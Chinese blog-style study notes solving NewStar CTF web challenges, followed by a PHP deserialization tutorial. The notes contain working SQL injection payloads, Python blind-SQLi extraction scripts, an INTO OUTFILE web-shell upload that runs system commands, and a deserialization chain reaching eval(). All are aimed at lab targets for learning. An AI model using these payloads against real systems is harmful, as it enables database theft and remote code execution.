---
title: newstar ctf复现
date: 2024-12-02 18:48:16
comments: true
description: 学习记录
categories:
- sql注入基础知识
- sqlmap基本使用
tags:
- sql语言
---

# newstar ctf复现

## week1让我皮蛋看看 flag 都藏哪了

在输入框输入`1 and 1=1`和`1 and 1=2`，发现第二次输入没有显示

说明是数字型注入，这里使用UNION注入

先看看列数多少

`1 ORDER BY 2`正确显示

`1 ORDER BY 3`报错

列数为2

判断回显位置

`-1 UNION SELECT 1,2`

返回

```
Name: "1"
Position: "2"
```

可以爆表了

```
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --所有表单名字
-1 union select 1,group_concat(column_name)from information_schema.columns where table_name='Fl4g' --所有列名
-1 union select 1,group_concat(0x5c,id,0x5c,des,0x5c,value) from Fl4g --返回列中所有数据
```

最终返回
```
Name: "1"
Position: "\5555\C0ngratu1ati0ns!\flag{NEw5T@r_ctf-Z024e497421ed64}"
```

flag即出

## week3-blindsql1

在输入框输入Alice能够返回成绩

加入单引号查询失败，再试试别的

```
Alice and 1=1
Alice and 1=2
```

提示空格被禁用

多次尝试发现只能盲注，可以试试插入 and 0 或者 and 1来控制返回情况，这就是布尔盲注

这里直接引用题解wp的爆破表名的py脚本

```python

import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + '_-{}':
        time.sleep(0.2) # 限制速率，防止请求过快

        print('[+] Trying:', c)

        # 这条语句能查询到当前数据库所有的表名
        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        # 获取所有表名的第 i 个字符，并计算 ascii 值
        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

得到一大堆表名里面有个secrets，直接尝试爆它列名

```python

import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+] Trying:', c)

        tables = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

爆破列名flag的内容

```python
import requests,string,time

url = 'http://127.0.0.1:9124/'

result = ''
for i in range(1,100):
    print(f'[+] Bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+] Trying:', c)

        tables = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，则 and 后面的结果是 true，会返回 Alice 的数据
        p = f'Alice\'and({b})#'

        res = requests.get(url, params={'student_name': p})

        if 'Alice' in res.text:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

搞了半天终于憋出来一个flag

flag{N3wSTar_ctF_Z0Z4171df39d1dc3}

## week4-blindsql2

一眼时间盲注，不用试探了，直接上脚本sleep试

爆表名(直接用wp的)

```python
import requests, string, time

url = 'http://127.0.0.1:2987/'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+]trying:', c)

        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        # 获取第 i 个字符，并计算 ascii 值
        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，会执行 sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:', c)
            result += c
            print(result)
            break
```

爆它secrets列名

```php
import requests, string, time

url = 'http://ip:port'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+]trying:' ,c)

        columns = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        # 获取第 i 个字符，并计算 ascii 值
        char = f'(ord(mid({columns},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，会执行 sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:', c)
            result += c
            print(result)
            break
```

爆它flag

```python
import requests, string, time

url = 'http://ip:port'

result = ''
for i in range(1,100):
    print(f'[+] bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+] trying:', c)

        flag = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        # 获取第 i 个字符，并计算 ascii 值
        char = f'(ord(mid({flag},{i},1)))'

        # 爆破该 ascii 值
        b = f'(({char})in({ord(c)}))'

        # 若 ascii 猜对了，会执行 sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url, params={'student_name':p})

        if res.elapsed.total_seconds() > 1.5:
            print('[*] bingo:', c)
            result += c
            print(result)
            break
```

代码逻辑跟布尔盲注的没差多少，就把返回的逻辑判断改为响应时间长短来确定字符的正确

## week5-sqlshell

这个sql注入一眼看到就傻了，不在数据库那怎么办

这个题目涉及了一句话木马(web shell)知识

题目为sqlshell，说明我们要利用文件上传(INTO OUTFILE,将查询结果写入服务器上的指定文件)漏洞

```python
import requests

url = 'http://192.168.109.128:8889'

payload = '\' || 1 union select 1,2,"<?php eval($_GET[1]);" into outfile \'/var/www/html/3.php\'#'

res = requests.get(url,params={'student_name': payload})
res = requests.get(f'{url}/3.php', params={'1': 'system("cat /you_cannot_read_the_flag_directly");'})
print(res.text)
```

# php反序列化

## 从序列化到反序列化

PHP 序列化（Serialization）是将 PHP 变量转换为可以存储或传输的字符串格式的过程。序列化的主要目的是保存变量的状态，以便可以在稍后的时间点恢复该状态。这个过程通过 serialize() 函数来完成。序列化的数据可以被存储在文件、数据库中，或者在网络上传输。

这其实是为了解决 PHP 对象传递的一个问题,因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦

---

序列化的作用

持久化存储：将复杂的数据结构（如对象或数组）保存到文件或数据库中，以便以后可以读取和使用

数据交换：通过网络传输数据时，确保数据结构的一致性和完整性

缓存：将计算结果序列化后存储起来，以避免重复计算，提高性能
序列化的过程

---

当你调用 serialize() 函数时，它会返回一个表示原始变量的字符串。这个字符串包含了足够的信息，使得可以通过 unserialize() 函数将其还原成原来的变量。对于对象来说，序列化还会保存对象的类名和属性值，但不会保存方法

例子

```php
<?php
// 创建一个数组
$data = array("apple", "banana", "orange");

// 序列化数组
$serialized_data = serialize($data);

// 输出序列化后的字符串
echo $serialized_data; // 输出: a:3:{i:0;s:5:"apple";i:1;s:6:"banana";i:2;s:6:"orange";}

// 之后，你可以将 $serialized_data 存储到文件或数据库中
?>
```

### 对象的序列化

对于对象，serialize() 会保存对象的类名和所有公共、保护成员变量的值。私有成员变量也会被保存，但是它们会被加上类名作为前缀。如果你希望在序列化或反序列化时执行特定的操作，可以定义魔术方法 __sleep() 和 __wakeup()：

__sleep()：当对象被序列化之前调用，可以用来清理资源或指定哪些属性应该被序列化

__wakeup()：当对象被反序列化之后调用，可以用来重新初始化资源

这里举个例子

```php
<?php

class test{

    public $name = 'P2hm1n';  

    private $sex = 'secret';  

    protected $age = '20';

}

$test1 = new test();

$object = serialize($test1);

print_r($object);

?>
```
输出结果为`O:4:"test":3:{s:4:"name";s:6:"P2hm1n";s:9:"testsex";s:6:"secret";s:6:"*age";s:2:"20";}`

private属性序列化的时候格式是 %00类名%00成员名

protected属性序列化的时候格式是 %00*%00成员名

>(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在
>
>这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。
>
>(2)我们在反序列化攻击的时候也就是依托类属性进行攻击
>
>因为没有序列化方法嘛，我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击（这是我们攻击的核心思想，这里先借此机会抛出来，大家有一个印象）

这里举个反序列化例子

```php
<?php

$object = 'O:4:"test":3:{s:4:"name";s:6:"P2hm1n";s:9:"testsex";s:6:"secret";s:6:"*age";s:2:"20";}';

$test = unserialize($object1);

print_r($test3);

?>
```

关键函数 unserialize():将经过序列化的字符串转换回PHP值

当有 protected 和 private 属性的时候记得补齐空的字符串

__wakeup()魔术方法

unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。

序列化public private protect参数产生不同结果

```php
<?php
class test{
    private $test1="hello";
    public $test2="hello";
    protected $test3="hello";
}
$test = new test();
echo serialize($test);  //  O:4:"test":3:{s:11:" test test1";s:5:"hello";s:5:"test2";s:5:"hello";s:8:" * test3";s:5:"hello";}
?>
```

private的参数被反序列化后变成 \00test\00test1 
public的参数变成 test2 
protected的参数变成 \00*\00test3

## 具备反序列化漏洞的前提

必须有 unserailize() 函数

unserailize() 函数的参数必须可控（为了成功达到控制你输入的参数所实现的功能，可能需要绕过一些魔术函数

常见魔术方法:

```
__construct()，类的构造函数

__destruct()，类的析构函数

__call()，在对象中调用一个不可访问方法时调用

__callStatic()，用静态方式中调用一个不可访问方法时调用

__get()，获得一个类的成员变量时调用

__set()，设置一个类的成员变量时调用

__isset()，当对不可访问属性调用isset()或empty()时调用

__unset()，当对不可访问属性调用unset()时被调用。

__sleep()，执行serialize()时，先会调用这个函数

__wakeup()，执行unserialize()时，先会调用这个函数

__toString()，类被当成字符串时的回应方法

__invoke()，调用函数的方式调用一个对象时的回应方法

__set_state()，调用var_export()导出类时，此静态方法会被调用。

__clone()，当对象复制完成时调用

__autoload()，尝试加载未定义的类

__debugInfo()，打印所需调试信息
```

魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的

示例

```
<?php 

class test{

    public $target = 'this is a test';

    function __destruct(){

        echo $this->target;

    }

}

$a = $_GET['b'];

$c = unserialize($a);

?>
```

存在unserialize() 函数，函数参数$a可以控制，就具备了利用反序列化漏洞的前提

## 如何攻击

靶子源代码

```php
<?php
class K0rz3n {
    private $test;
    public $K0rz3n = "i am K0rz3n";
    function __construct() {
        $this->test = new L();
    }

    function __destruct() {
        $this->test->action();
    }
}

class L {
    function action() {
        echo "Welcome to XDSEC";
    }
}

class Evil {

    var $test2;
    function action() {
        eval($this->test2);
    }
}

unserialize($_GET['test']);
```

unserialize() 函数的参数我们是可以控制的

能通过这个接口反序列化任何类的对象

当前这三个类,后面两个类反序列化以后对我们没有任何意义，因为我们根本没法调用其中的方法

第一个类就不一样,有一个魔法函数 __destruct(),在对象销毁的时候自动调用,就决定反序列化这个类的对象

destruct() 里面只用到了一个属性 test 

再观察一下,Evil 这个类中发现他的 action() 函数调用了 eval()

将 K0rz3n 这个类中的 test 属性篡改为 Evil 这个类的对象,篡改 Evil 对象的 test2 属性，将其改成我们的 Payload

生成 payload 代码：

```php
<?php
class K0rz3n {
    private $test;
    function __construct() {
        $this->test = new Evil;
    }
}


class Evil {

    var $test2 = "phpinfo();";

}

$K0rz3n = new K0rz3n;
$data = serialize($K0rz3n);
file_put_contents("seria.txt", $data);
```

去除了一切与我们要篡改的属性无关的内容，对其进行序列化操作，然后将序列化的结果复制出来，向刚刚的代码发起请求比如

`http://127.0.0.1/php_unserialize/K0rz3n.php?test=O:6:"K0rz3n":1:{s:12:"K0rz3ntest";O:4:"Evil":1:{s:5:"test2";s:10:"phpinfo();";}}`

## 总结
(1) 寻找 unserialize() 函数的参数是否有我们的可控点

(2) 寻找我们的反序列化的目标，重点寻找存在 wakeup() 或 destruct() 魔法函数的类

(3) 一层一层地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的

(4) 找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击
